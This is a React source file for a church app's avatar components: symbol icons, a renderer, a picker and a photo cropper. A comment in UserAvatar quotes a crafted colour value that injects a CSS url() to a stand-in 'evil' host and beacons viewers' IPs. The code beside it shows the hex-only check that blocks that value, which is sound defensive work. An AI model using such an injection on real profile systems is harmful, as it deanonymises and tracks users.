// identity-avatar.jsx — avatar symbol set, UserAvatar renderer, AvatarPicker
const { useState: useAv } = React;

// ── vector symbol marks (Halo-styled, 1.8 stroke on 24 grid) ──
function AvSymbol({ name, size = 24, color = 'currentColor', stroke = 1.8 }) {
  const p = { fill: 'none', stroke: color, strokeWidth: stroke, strokeLinecap: 'round', strokeLinejoin: 'round' };
  const marks = {
    halo: <><circle cx="12" cy="12" r="7.4" fill="none" stroke={color} strokeWidth={stroke + .4} strokeLinecap="round" strokeDasharray="11.6 3.6" transform="rotate(-90 12 12)" /><circle cx="12" cy="12" r="1.6" fill={color} /></>,
    dove: <><path d="M4 14c2.5.4 4.4-.3 6-2 .8 2.4 2.6 3.6 5 3.6 2.8 0 4.6-2 4.6-4.4 0-1.6-1-3-2.6-3.4.3-1 .1-2-.6-2.8-.4 1.2-1.2 1.8-2.4 2-2.8.4-5 1.6-6.4 3.8L4 14Z" {...p} /><path d="M9.5 16.5 8 20" {...p} /></>,
    fish: <><path d="M4.5 12c2.6-3.2 6-4.8 8.8-4.8 2 0 3.8.6 5.4 1.8l2.8-2.4-1 4 1 4-2.8-2.4c-1.6 1.2-3.4 1.8-5.4 1.8-2.8 0-6.2-1.6-8.8-4.8Z" {...p} /><circle cx="8.2" cy="10.8" r=".7" fill={color} stroke="none" /></>,
    flame: <><path d="M12 3.5c.6 3 2.4 4.3 3.8 5.9 1.2 1.4 2.2 2.8 2.2 5A6 6 0 0 1 6 13.6c0-1.4.5-2.6 1.3-3.5.3 1 .9 1.6 1.8 1.9-.5-2.8 1-5.8 2.9-8.5Z" {...p} /></>,
    vine: <><path d="M12 9V5.5" {...p} /><path d="M12 5.5c1.6-.4 3-1.2 3.6-2.6-1.7-.3-3 .2-3.6 1.4" {...p} fill={color} fillOpacity=".18" /><g {...p} fill={color} fillOpacity=".16"><circle cx="9" cy="11" r="2" /><circle cx="15" cy="11" r="2" /><circle cx="12" cy="13.6" r="2" /><circle cx="9.6" cy="16.4" r="2" /><circle cx="14.4" cy="16.4" r="2" /><circle cx="12" cy="19" r="2" /></g></>,
    wheat: <><path d="M12 21V8" {...p} /><path d="M12 8c0-2 1.4-3.4 3-4-.2 2-1 3.4-3 4ZM12 8c0-2-1.4-3.4-3-4 .2 2 1 3.4 3 4Z" {...p} /><path d="M12 13c0-1.8 1.3-3 2.8-3.6-.2 1.8-.9 3-2.8 3.6ZM12 13c0-1.8-1.3-3-2.8-3.6.2 1.8.9 3 2.8 3.6ZM12 17.5c0-1.8 1.3-3 2.8-3.6-.2 1.8-.9 3-2.8 3.6ZM12 17.5c0-1.8-1.3-3-2.8-3.6.2 1.8.9 3 2.8 3.6Z" {...p} /></>,
    anchor: <><circle cx="12" cy="5.5" r="2" {...p} /><path d="M12 7.5V20" {...p} /><path d="M7 11h10" {...p} /><path d="M5 13c0 4 3 6.5 7 6.5s7-2.5 7-6.5" {...p} /></>,
    crook: <><path d="M9 21V9a4 4 0 0 1 8 0c0 1.6-1.2 2.6-2.6 2.6S12 10.6 12 9.2" {...p} /></>,
    chalice: <><path d="M7 4h10l-1 5a4 4 0 0 1-8 0L7 4Z" {...p} /><path d="M12 13v5M8.5 20.5h7" {...p} /></>,
    olive: <><path d="M5 19C8.5 13.5 12.5 9.5 19 6.5" {...p} /><g fill={color} fillOpacity=".2" stroke={color} strokeWidth={stroke * .85}><ellipse cx="9.4" cy="13.8" rx="1.7" ry="3" transform="rotate(38 9.4 13.8)" /><ellipse cx="13.2" cy="10.6" rx="1.7" ry="3" transform="rotate(28 13.2 10.6)" /><ellipse cx="17" cy="8.2" rx="1.7" ry="3" transform="rotate(18 17 8.2)" /></g></>,
    mountain: <><path d="M3 18.5 9 7l4 6.5 2-3 6 8H3Z" {...p} /><path d="m7.4 10.4 1.6 1.4 1.4-1.2" {...p} /></>,
    well: <><path d="M5 9h14M6 9l1 11h10l1-11" {...p} /><path d="M5 9 8 4.5h8L19 9" {...p} /><path d="M10 13.5h4M10 16.5h4" {...p} /></>,
    star: <><path d="M12 3.5c.8 4.2 1.9 5.3 6.1 6.1-4.2.8-5.3 1.9-6.1 6.1-.8-4.2-1.9-5.3-6.1-6.1 4.2-.8 5.3-1.9 6.1-6.1Z" {...p} /><path d="M17.5 16c.3 1.7.8 2.2 2.5 2.5-1.7.3-2.2.8-2.5 2.5-.3-1.7-.8-2.2-2.5-2.5 1.7-.3 2.2-.8 2.5-2.5Z" {...p} /></>,
  };
  return <svg width={size} height={size} viewBox="0 0 24 24" aria-hidden="true">{marks[name] || marks.halo}</svg>;
}
window.AvSymbol = AvSymbol;

// ── the canonical avatar renderer ──
// av = { kind:'monogram'|'symbol', color, symbol }, name used for monogram initial
function UserAvatar({ av, name, size = 44, ring = false }) {
  // av.color comes from an untrusted kind-0 profile and is interpolated straight into CSS below (boxShadow +
  // the gradient). Accept ONLY a hex literal, so a crafted value like "#fff),url(https://evil/beacon?p=…)/*"
  // can't smuggle a url() into background and beacon every viewer's IP/online-status (deanonymisation vector).
  const _rawColor = (av && av.color) || '';
  const color = /^#[0-9a-fA-F]{3,8}$/.test(_rawColor) ? _rawColor : '#5E8C6A';
  const initial = (name && name.trim()) ? name.trim()[0].toUpperCase() : null;
  const shadow = ring ? `0 0 0 3px var(--surface), 0 0 0 4.5px ${color}` : 'none';
  // uploaded photo — only ever offered when the church enables member photos AND the member isn't a minor
  if (av && av.kind === 'photo' && av.photo) {
    return <img src={av.photo} alt={name ? name + '’s picture' : 'Profile picture'} style={{
      width: size, height: size, borderRadius: 999, flexShrink: 0, objectFit: 'cover', display: 'block',
      boxShadow: shadow, background: 'var(--surface-2)' }} />;
  }
  const bg = `linear-gradient(150deg, ${color}, color-mix(in oklab, ${color} 62%, #16120c))`;
  return (
    <div style={{
      width: size, height: size, borderRadius: 999, flexShrink: 0, background: bg,
      display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff',
      boxShadow: shadow,
      fontFamily: 'var(--font-display)', fontWeight: 800, fontSize: size * 0.4, lineHeight: 1,
    }}>
      {av && av.kind === 'monogram'
        ? (initial || <AvSymbol name="halo" size={size * 0.55} color="#fff" />)
        : <AvSymbol name={(av && av.symbol) || 'halo'} size={size * 0.56} color="#fff" stroke={size > 60 ? 1.5 : 1.9} />}
    </div>
  );
}
window.UserAvatar = UserAvatar;

// ── avatar picker (the hero of the profile) ──
function AvatarPicker({ value, name, onChange, allowPhoto }) {
  const D = window.TrinityData;
  const [tab, setTab] = useAv(value.kind === 'monogram' ? 'monogram' : (value.kind === 'photo' && allowPhoto) ? 'photo' : 'symbol');
  const [cropFile, setCropFile] = useAv(null);
  const fileRef = React.useRef(null);
  const color = value.color;
  const setColor = (c) => onChange({ ...value, color: c });
  const tabs = allowPhoto ? [['symbol', 'Symbol'], ['monogram', 'Initial'], ['photo', 'Photo']] : [['symbol', 'Symbol'], ['monogram', 'Initial']];

  return (
    <div>
      {/* preview */}
      <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 18 }}>
        <UserAvatar av={value} name={name} size={96} />
      </div>

      {/* source toggle */}
      <div style={{ display: 'flex', gap: 4, padding: 4, borderRadius: 13, background: 'var(--surface-2)', border: '1px solid var(--line)', marginBottom: 16 }}>
        {tabs.map(([k, lbl]) => {
          const on = tab === k;
          return (
            <button key={k} onClick={() => {
              setTab(k);
              if (k === 'photo') { if (value.photo) onChange({ ...value, kind: 'photo' }); else if (fileRef.current) fileRef.current.click(); }
              else onChange({ ...value, kind: k, symbol: k === 'symbol' ? (value.symbol || 'olive') : undefined });
            }} style={{
              flex: 1, padding: '10px', borderRadius: 10, border: 'none', cursor: 'pointer',
              fontFamily: 'var(--font-ui)', fontWeight: 700, fontSize: 14,
              background: on ? 'var(--surface)' : 'transparent', color: on ? 'var(--clay)' : 'var(--ink-2)',
              boxShadow: on ? 'var(--shadow)' : 'none',
            }}>{lbl}</button>
          );
        })}
      </div>

      <input ref={fileRef} type="file" accept="image/*" style={{ display: 'none' }} onChange={e => { const f = e.target.files && e.target.files[0]; if (f) setCropFile(f); e.target.value = ''; }} />

      {/* symbol gallery / photo / initial */}
      {tab === 'symbol' ? (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 10, marginBottom: 18 }}>
          {D.AVATAR_SYMBOLS.map(s => {
            const on = value.symbol === s;
            return (
              <button key={s} onClick={() => onChange({ ...value, kind: 'symbol', symbol: s })} style={{
                aspectRatio: '1', borderRadius: 14, cursor: 'pointer',
                border: on ? `2px solid ${color}` : '1px solid var(--line)',
                background: on ? `color-mix(in oklab, ${color} 14%, var(--surface))` : 'var(--surface-2)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                color: on ? color : 'var(--ink-2)', transition: 'all .15s',
              }}><AvSymbol name={s} size={26} stroke={1.9} /></button>
            );
          })}
        </div>
      ) : tab === 'photo' ? (
        <div style={{ marginBottom: 18, textAlign: 'center' }}>
          <button onClick={() => { if (fileRef.current) fileRef.current.click(); }} style={{
            width: '100%', padding: '12px', borderRadius: 12, cursor: 'pointer', border: '1px solid var(--line)', background: 'var(--surface)', color: 'var(--clay)',
            fontFamily: 'var(--font-ui)', fontWeight: 700, fontSize: 14, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
            <Icon name="plus" size={16} color="currentColor" /> {value.photo ? 'Change photo' : 'Choose a photo'}</button>
          {value.photo ? <button onClick={() => onChange({ ...value, kind: 'symbol', symbol: value.symbol || 'olive', photo: undefined })} style={{ marginTop: 10, border: 'none', background: 'none', color: 'var(--ink-3)', fontSize: 13, fontWeight: 600, cursor: 'pointer', fontFamily: 'var(--font-ui)' }}>Remove photo</button> : null}
          <p style={{ fontSize: 12.5, color: 'var(--ink-3)', margin: '12px 0 0', lineHeight: 1.5, fontFamily: 'var(--font-read)' }}>Your church allows photos. It’s stored with your profile and visible to your church — choose one you’re happy for them to see.</p>
        </div>
      ) : (
        <p style={{ textAlign: 'center', fontSize: 13.5, color: 'var(--ink-2)', margin: '0 0 18px', fontFamily: 'var(--font-read)' }}>
          {name && name.trim() ? `Your initial “${name.trim()[0].toUpperCase()}” on a color you pick.` : 'Add a name above and your initial appears here.'}
        </p>
      )}

      {/* color row — not used by a photo */}
      {tab !== 'photo' ? <React.Fragment>
      <div style={{ fontSize: 12, fontWeight: 700, color: 'var(--ink-3)', letterSpacing: '.5px', marginBottom: 9 }}>COLOR</div>
      <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
        {D.AVATAR_COLORS.map(c => {
          const on = color === c;
          return (
            <button key={c} onClick={() => setColor(c)} style={{
              width: 38, height: 38, borderRadius: 999, cursor: 'pointer', background: c,
              border: on ? '2.5px solid var(--ink)' : '2px solid var(--line)',
              display: 'flex', alignItems: 'center', justifyContent: 'center',
            }}>{on ? <Icon name="check" size={17} stroke={2.8} color="#fff" /> : null}</button>
          );
        })}
      </div>
      </React.Fragment> : null}

      {cropFile ? <AvatarCropModal file={cropFile} onSave={uri => { onChange({ ...value, kind: 'photo', photo: uri }); setCropFile(null); setTab('photo'); }} onClose={() => setCropFile(null)} /> : null}
    </div>
  );
}
window.AvatarPicker = AvatarPicker;

// ── avatar photo cropper (member side; fixed 256² round; mirrors the steward ImageCropModal) ──
function AvatarCropModal({ file, onSave, onClose }) {
  const OUT = 256, DW = 300;
  const ref = React.useRef(null);
  const [img, setImg] = useAv(null);
  const [zoom, setZoom] = useAv(1);
  const [pan, setPan] = useAv({ x: 0.5, y: 0.5 });
  const [busy, setBusy] = useAv(false);
  const drag = React.useRef(null);
  React.useEffect(() => {
    const im = new Image();
    im.onload = () => setImg(im);
    const r = new FileReader(); r.onload = () => { im.src = r.result; }; r.readAsDataURL(file);
  }, [file]);
  const paint = (canvas, cw, ch) => {
    const c = canvas.getContext('2d'); c.clearRect(0, 0, cw, ch);
    if (!img) return;
    const cover = Math.max(cw / img.width, ch / img.height), s = cover * zoom;
    const dw = img.width * s, dh = img.height * s;
    c.drawImage(img, -(dw - cw) * pan.x, -(dh - ch) * pan.y, dw, dh);
  };
  React.useEffect(() => { if (ref.current) paint(ref.current, DW, DW); }, [img, zoom, pan]);   // eslint-disable-line
  const onDown = (e) => { drag.current = { x: e.clientX, y: e.clientY, px: pan.x, py: pan.y }; try { e.currentTarget.setPointerCapture(e.pointerId); } catch (err) {} };
  const onMove = (e) => {
    if (!drag.current || !img) return;
    const cover = Math.max(DW / img.width, DW / img.height), s = cover * zoom;
    const ovX = img.width * s - DW, ovY = img.height * s - DW;
    setPan({ x: Math.min(1, Math.max(0, drag.current.px - (e.clientX - drag.current.x) / (ovX || 1))), y: Math.min(1, Math.max(0, drag.current.py - (e.clientY - drag.current.y) / (ovY || 1))) });
  };
  const onUp = () => { drag.current = null; };
  const save = () => {
    if (!img) return; setBusy(true);
    const c = document.createElement('canvas'); c.width = OUT; c.height = OUT; paint(c, OUT, OUT);
    let uri = ''; try { uri = c.toDataURL('image/webp', 0.82); } catch (e) {}
    if (!uri || uri.length < 30) uri = c.toDataURL('image/jpeg', 0.82);
    onSave(uri);
  };
  return (
    <div onClick={onClose} style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 22, background: 'color-mix(in oklab, var(--ink) 40%, transparent)', backdropFilter: 'blur(4px)' }}>
      <div onClick={e => e.stopPropagation()} style={{ width: 360, maxWidth: '100%', background: 'var(--paper)', borderRadius: 22, border: '1px solid var(--line)', boxShadow: '0 24px 70px rgba(0,0,0,.3)', padding: 22 }}>
        <div style={{ fontFamily: 'var(--font-display)', fontWeight: 700, fontSize: 18, marginBottom: 6 }}>Position your photo</div>
        <div style={{ fontSize: 13, color: 'var(--ink-2)', lineHeight: 1.5, marginBottom: 14 }}>Drag to reposition, slide to zoom. What’s inside the circle is what your church will see.</div>
        <div style={{ display: 'flex', justifyContent: 'center' }}>
          <canvas ref={ref} width={DW} height={DW} onPointerDown={onDown} onPointerMove={onMove} onPointerUp={onUp} onPointerLeave={onUp}
            style={{ width: DW, height: DW, maxWidth: '100%', borderRadius: '50%', border: '1px solid var(--line)', cursor: 'grab', touchAction: 'none', background: 'var(--surface-2)' }} />
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 11, margin: '15px 2px 4px' }}>
          <Icon name="search" size={15} color="var(--ink-3)" />
          <input type="range" min="1" max="4" step="0.01" value={zoom} onChange={e => setZoom(parseFloat(e.target.value))} style={{ flex: 1 }} />
        </div>
        <div style={{ display: 'flex', gap: 10, marginTop: 14 }}>
          <button onClick={onClose} style={{ flex: 1, padding: 12, borderRadius: 12, border: '1px solid var(--line)', background: 'var(--surface)', color: 'var(--ink-2)', fontWeight: 700, fontSize: 14, cursor: 'pointer', fontFamily: 'var(--font-ui)' }}>Cancel</button>
          <button onClick={save} disabled={!img || busy} style={{ flex: 2, padding: 12, borderRadius: 12, border: 'none', background: 'var(--clay)', color: '#fff', fontWeight: 700, fontSize: 14, cursor: 'pointer', fontFamily: 'var(--font-ui)', opacity: (!img || busy) ? .6 : 1 }}>{busy ? 'Saving…' : 'Use photo'}</button>
        </div>
      </div>
    </div>
  );
}
window.AvatarCropModal = AvatarCropModal;
